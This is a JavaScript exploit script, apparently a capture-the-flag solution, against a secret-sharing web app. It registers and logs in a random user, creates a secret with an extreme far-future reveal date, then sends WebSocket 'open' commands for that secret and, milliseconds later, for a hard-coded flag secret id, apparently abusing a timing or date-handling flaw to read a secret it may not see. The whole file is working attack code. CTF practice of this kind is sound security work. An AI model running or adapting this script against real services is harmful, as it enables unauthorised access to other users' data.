import { randomBytes } from "crypto";
import WebSocket from "ws";

const TARGET = process.env.TARGET ?? "http://localhost:3000";
const FLAG_SECRET_ID = "13371337-1337-1337-1337-133713371337";

const username = randomBytes(16).toString("hex");
const password = randomBytes(16).toString("hex");

await fetch(`${TARGET}/api/register`, {
	method: "POST",
	headers: { "Content-Type": "application/json" },
	body: JSON.stringify({ username, password }),
});

console.log("Registered user", username, "with password", password);

const loginResponse = await fetch(`${TARGET}/api/login`, {
	method: "POST",
	headers: { "Content-Type": "application/json" },
	body: JSON.stringify({ username, password }),
});

const cookie = loginResponse.headers.get("set-cookie").match(/session=([^;]+)/)[0];

console.log("Logged in as", username, "with cookie", cookie);

const createResponse = await fetch(`${TARGET}/api/secrets/create`, {
	method: "POST",
	headers: { "Cookie": cookie, "Content-Type": "application/json" },
	body: JSON.stringify({
		name: "pwn",
		secret: "pwn",
		revealAt: "+100000-01-01T00:00:00.000Z",
	}),
});

const secretId = (await createResponse.json()).id;

console.log("Created secret", secretId);

const ws = new WebSocket("ws://localhost:80/api/ws");
ws.addEventListener("open", () => {
	ws.addEventListener("message", (event) => {
		console.log(event.data);
	});
	ws.send(JSON.stringify({ command: "open", id: secretId }));
	setTimeout(() => {
		ws.send(JSON.stringify({ command: "open", id: FLAG_SECRET_ID }));
	}, 5);
});